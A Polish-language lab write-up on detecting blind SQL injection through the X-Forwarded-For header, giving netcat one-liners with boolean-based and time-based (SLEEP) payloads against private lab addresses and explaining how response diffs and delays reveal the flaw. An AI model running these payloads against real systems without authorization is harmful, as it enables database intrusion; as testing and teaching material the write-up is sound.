# Blind SQL Injection

## Narzędzia
- **netcat** – wysyłanie surowych żądań HTTP
- **bash** – automatyzacja testów

## Procedura testowania
Wykorzystano nagłówek `X-Forwarded-For`, który jest jednym z podatnych punktów SQL injection, ponieważ:
- Nie jest łatwo dostępny przez przeglądarkę
- Serwer może go użyć w zapytaniu SQL bez validacji
- Jest trudniejszy do wykrycia niż parametry GET/POST

## Polecenia testowe

### Test podstawowy – normalny dostęp
```bash
echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: 192.168.56.101\r\nConnection: close\r\n\r\n" | nc 192.168.56.103 80
```

### Test SQL injection – Boolean-based
```bash
echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: 192.168.56.1' OR '1'='1\r\nConnection: close\r\n\r\n" | nc 192.168.56.100 80
```

### Test SQL injection – Time-based (SLEEP)
```bash
time echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: 192.168.56.1' AND SLEEP(5) or '1'='1\r\nConnection: close\r\n\r\n" | nc 192.168.56.100 80
```

## 4. Sposób detekcji SQL Injection

### Metoda 1: Boolean-based Blind SQL Injection
**Jak działa:**
- Wysyłamy dwa żądania: jedno z warunkiem `TRUE` i jedno z `FALSE`
- Porównujemy odpowiedzi serwera
- Jeśli odpowiedzi różnią się (inna zawartość, liczba rekordów) → vulnerability istnieje

**Przykład:**
```bash
# Zapisz normalną odpowiedź
echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: 192.168.56.101\r\nConnection: close\r\n\r\n" | nc 192.168.56.103 80 > response_normal.txt

# Zapisz odpowiedź z injection
echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: 192.168.56.101' OR '1'='1\r\nConnection: close\r\n\r\n" | nc 192.168.56.103 80 > response_injection.txt

# Porównaj
diff response_normal.txt response_injection.txt
```

## 5. Testowanie oparte na opóźnieniu (Time-based Blind SQL Injection)

### Jak to działa?

**SLEEP** to funkcja SQL, która wstrzymuje wykonanie zapytania na określoną liczbę sekund.

**Payload:**
```
X-Forwarded-For: 192.168.56.101' AND SLEEP(5) OR '1'='1
```

**Co się stanie:**
- Jeśli serwer jest podatny → odpowiedź będzie przyjmować **~5 sekund**
- Jeśli nie jest podatny → odpowiedź będzie natychmiastowa (~0-1 sekunda)

### Test praktyczny

```bash
# Normalnie - powinno być szybko
time echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: 192.168.56.101\r\nConnection: close\r\n\r\n" | nc 192.168.56.103 80
# Wynik: real 0m0.XXXs

# Z SLEEP(5) - powinno czekać 5 sekund
time echo -e "GET / HTTP/1.0\r\nX-Forwarded-For: 192.168.56.101' AND SLEEP(5) or '1'='1\r\nConnection: close\r\n\r\n" | nc 192.168.56.103 80
# Wynik: real 0m5.XXXs ← VULNERABILITY!
```